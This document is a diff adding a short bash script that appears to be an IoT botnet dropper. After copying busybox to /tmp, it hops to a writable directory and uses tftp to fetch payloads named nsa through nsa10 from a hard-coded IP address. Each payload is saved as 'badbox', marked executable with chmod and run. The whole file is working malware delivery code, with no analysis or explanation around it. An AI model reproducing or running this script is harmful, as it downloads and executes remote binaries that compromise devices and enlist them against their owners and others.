@@ -1,0 +1,14 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get nsa;cat nsa >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get nsa1;cat nsa1 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get nsa2;cat nsa2 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get nsa3;cat nsa3 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get nsa4;cat nsa4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get nsa5;cat nsa5 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get nsa6;cat nsa6 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get nsa7;cat nsa7 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get nsa8;cat nsa8 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get nsa9;cat nsa9 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 89.39.107.56 -c get nsa10;cat nsa10 >badbox;chmod +x *;./badbox
